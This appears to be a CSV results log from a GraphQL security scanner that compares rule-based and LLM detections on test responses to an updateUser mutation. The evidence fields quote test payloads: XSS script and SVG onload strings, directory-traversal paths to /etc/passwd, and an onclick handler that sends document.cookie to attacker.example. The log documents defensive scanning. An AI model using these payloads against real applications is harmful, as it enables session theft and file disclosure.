timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-03T09:52:21.691281,updateUser_response_2,200,1,0,0.0,simple_only,,Injection Attacks,,0,1,0,0,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""SQL Injection (SQLi) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SQL injection vulnerability detected - malicious SQL patterns found in response"", ""evidence"": ""Response status: 200, SQL patterns detected in response""}]",[]
2025-10-03T09:52:34.156032,updateUser_response_3,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL response returns unescaped HTML/JS payloads in user-controlled fields: the name field contains a <script> tag and the website field contains an SVG onload payload. If a web client renders these values into a page without proper encoding or sanitization (for example using innerHTML), these payloads will execute in users' browsers, leading to reflected or stored XSS. The mutation name (updateUser) suggests the values may be stored and later rendered, increasing impact. Mitigation: treat these fields as plain text, escape/HTML-encode output on the client, sanitize or reject HTML in inputs on the server, and enforce a Content Security Policy. The finding is marked with high severity because script execution in a browser can lead to session theft, account takeover, or other user-impacting attacks."", ""evidence"": ""\""name\"": \""<script>alert('xss')</script>\"", \""website\"": \""http://example.com/<svg/onload=alert('xss')>\"""", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""HIGH"", ""confidence"": 0.9, ""evidence"": ""\""name\"": \""<script>alert('xss')</script>\"", \""website\"": \""http://example.com/<svg/onload=alert('xss')>\"""", ""explanation"": ""The GraphQL response returns unescaped HTML/JS payloads in user-controlled fields: the name field contains a <script> tag and the website field contains an SVG onload payload. If a web client renders these values into a page without proper encoding or sanitization (for example using innerHTML), these payloads will execute in users' browsers, leading to reflected or stored XSS. The mutation name (updateUser) suggests the values may be stored and later rendered, increasing impact. Mitigation: treat these fields as plain text, escape/HTML-encode output on the client, sanitize or reject HTML in inputs on the server, and enforce a Content Security Policy. The finding is marked with high severity because script execution in a browser can lead to session theft, account takeover, or other user-impacting attacks.""}}]"
2025-10-03T09:52:55.134363,updateUser_response_4,200,1,0,0.0,simple_only,,Injection Attacks,,0,1,0,0,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Server-Side Request Forgery (SSRF) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SSRF injection vulnerability detected - internal network access patterns found"", ""evidence"": ""Response status: 200, SSRF keywords detected in response""}]",[]
2025-10-03T09:53:11.660353,updateUser_response_5,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-03T09:53:28.765123,updateUser_response_6,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,0,1,0,1.0,both_potential,Injection Attacks,,,"[{""detection_name"": ""Path Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""Path injection vulnerability detected - file system access patterns found"", ""evidence"": ""Response status: 200, Path injection patterns detected in response""}]","[{""detection_name"": ""LLM: path_injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL updateUser response contains file-system related values and explicit directory-traversal patterns. The website field returns a file URI referencing /etc/passwd and the address fields contain multiple \""../\"" segments and references to sensitive paths (e.g. /etc/passwd and /var/www/html/index.php). This strongly indicates that user-controllable data is being used to construct file paths (or at least being stored/echoed as file paths), which can enable directory traversal or local file access if those values are ever used by the server in file operations. While the response does not include file contents (only path strings), the presence of file:// and traversal sequences is a concrete indicator of path manipulation and a likely path injection/dir-traversal issue. Recommended actions: validate and canonicalize all path inputs, disallow file:// URIs or normalize and enforce an allowlist of safe base directories, strip/deny \""..\"" segments, and ensure principle of least privilege for any file access operations to prevent disclosure or modification of sensitive files."", ""evidence"": ""Fields in response contain file system URIs and directory traversal sequences: website=\""file:///etc/passwd\"", address.street=\""../../../../../etc/passwd\"", address.suite=\""../../../var/www/html/index.php\"""", ""confidence"": 0.75, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""path_injection"", ""severity"": ""MEDIUM"", ""confidence"": 0.75, ""evidence"": ""Fields in response contain file system URIs and directory traversal sequences: website=\""file:///etc/passwd\"", address.street=\""../../../../../etc/passwd\"", address.suite=\""../../../var/www/html/index.php\"""", ""explanation"": ""The GraphQL updateUser response contains file-system related values and explicit directory-traversal patterns. The website field returns a file URI referencing /etc/passwd and the address fields contain multiple \""../\"" segments and references to sensitive paths (e.g. /etc/passwd and /var/www/html/index.php). This strongly indicates that user-controllable data is being used to construct file paths (or at least being stored/echoed as file paths), which can enable directory traversal or local file access if those values are ever used by the server in file operations. While the response does not include file contents (only path strings), the presence of file:// and traversal sequences is a concrete indicator of path manipulation and a likely path injection/dir-traversal issue. Recommended actions: validate and canonicalize all path inputs, disallow file:// URIs or normalize and enforce an allowlist of safe base directories, strip/deny \""..\"" segments, and ensure principle of least privilege for any file access operations to prevent disclosure or modification of sensitive files.""}}]"
2025-10-03T09:53:42.985417,updateUser_response_7,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""HTML Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""HTML injection vulnerability detected - HTML markup found in response"", ""evidence"": ""Response status: 200, HTML patterns detected in response data""}]","[{""detection_name"": ""LLM: html_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL response returns user.name containing raw HTML with an onclick attribute that performs a fetch to an attacker-controlled domain including document.cookie. If a client renders this value into the DOM without proper escaping (e.g., using innerHTML), the onclick handler can execute in the victim's browser and exfiltrate cookies \u2014 a clear client-side HTML/JS injection (effectively an XSS vector). The presence of executable markup in the API response is strong evidence of HTML injection. Remediation: treat user-supplied strings as untrusted by default \u2014 escape/encode output when inserting into HTML, disallow or sanitize HTML in user inputs, and apply a strict Content Security Policy to limit script execution."", ""evidence"": ""\""name\"": \""<div onclick=\\\""fetch('https://attacker.example/steal?c='+document.cookie)\\\"">Click me</div>\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""HIGH"", ""confidence"": 0.95, ""evidence"": ""\""name\"": \""<div onclick=\\\""fetch('https://attacker.example/steal?c='+document.cookie)\\\"">Click me</div>\"""", ""explanation"": ""The GraphQL response returns user.name containing raw HTML with an onclick attribute that performs a fetch to an attacker-controlled domain including document.cookie. If a client renders this value into the DOM without proper escaping (e.g., using innerHTML), the onclick handler can execute in the victim's browser and exfiltrate cookies \u2014 a clear client-side HTML/JS injection (effectively an XSS vector). The presence of executable markup in the API response is strong evidence of HTML injection. Remediation: treat user-supplied strings as untrusted by default \u2014 escape/encode output when inserting into HTML, disallow or sanitize HTML in user inputs, and apply a strict Content Security Policy to limit script execution.""}}]"
2025-10-03T09:53:54.356701,updateUser_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-03T09:54:05.476311,updateUser_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-03T09:54:26.708588,updateUser_response_10,400,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,0,0,1,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: Introspection / Schema Exposure"", ""detection"": ""safe"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL error message discloses schema information (the fact that 'updateUser' is not a field on the 'Query' type). Even though a formal introspection query was not performed, this validation error reveals type/field information that can be used to enumerate the API schema. This is an information-disclosure risk that can aid attackers in mapping available operations. Severity is low because no sensitive data is returned and this is limited to schema enumeration, but it should be treated as a privacy/security concern. Mitigations: suppress detailed GraphQL validation errors in production, return generic error messages, and/or disable detailed schema output to unauthenticated users."", ""evidence"": ""Error message: \""Cannot query field \\\""updateUser\\\"" on type \\\""Query\\\"".\"" (GRAPHQL_VALIDATION_FAILED)"", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""Introspection / Schema Exposure"", ""severity"": ""LOW"", ""confidence"": 0.8, ""evidence"": ""Error message: \""Cannot query field \\\""updateUser\\\"" on type \\\""Query\\\"".\"" (GRAPHQL_VALIDATION_FAILED)"", ""explanation"": ""The GraphQL error message discloses schema information (the fact that 'updateUser' is not a field on the 'Query' type). Even though a formal introspection query was not performed, this validation error reveals type/field information that can be used to enumerate the API schema. This is an information-disclosure risk that can aid attackers in mapping available operations. Severity is low because no sensitive data is returned and this is limited to schema enumeration, but it should be treated as a privacy/security concern. Mitigations: suppress detailed GraphQL validation errors in production, return generic error messages, and/or disable detailed schema output to unauthenticated users.""}}]"
2025-10-03T09:54:55.937214,updateUser_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Unknown,1,0,0,0,0,1,0.0,no_potential,,,,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: field_suggestions"", ""detection"": ""safe"", ""category"": ""Unknown"", ""description"": ""The GraphQL response returns explicit 'Did you mean \""<field>\""?' suggestions for misspelled fields. This behavior leaks schema information (exact field names on the User type), which enables an attacker to enumerate or fingerprint API schema and craft targeted queries. While this is not an immediate code-execution or data-exfiltration vulnerability, it is an information-disclosure issue that lowers the effort required for further attacks. Recommended mitigations: disable or suppress field name suggestions in validation errors, return generic validation messages, and avoid exposing schema hints in production error responses."", ""evidence"": ""Error messages: \""Cannot query field \\\""usernme\\\"" on type \\\""User\\\"". Did you mean \\\""username\\\""?\"", \""Cannot query field \\\""emial\\\"" on type \\\""User\\\"". Did you mean \\\""email\\\""?\"", \""Cannot query field \\\""nam\\\"" on type \\\""User\\\"". Did you mean \\\""name\\\""?\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""field_suggestions"", ""severity"": ""LOW"", ""confidence"": 0.95, ""evidence"": ""Error messages: \""Cannot query field \\\""usernme\\\"" on type \\\""User\\\"". Did you mean \\\""username\\\""?\"", \""Cannot query field \\\""emial\\\"" on type \\\""User\\\"". Did you mean \\\""email\\\""?\"", \""Cannot query field \\\""nam\\\"" on type \\\""User\\\"". Did you mean \\\""name\\\""?\"""", ""explanation"": ""The GraphQL response returns explicit 'Did you mean \""<field>\""?' suggestions for misspelled fields. This behavior leaks schema information (exact field names on the User type), which enables an attacker to enumerate or fingerprint API schema and craft targeted queries. While this is not an immediate code-execution or data-exfiltration vulnerability, it is an information-disclosure issue that lowers the effort required for further attacks. Recommended mitigations: disable or suppress field name suggestions in validation errors, return generic validation messages, and avoid exposing schema hints in production error responses.""}}]"
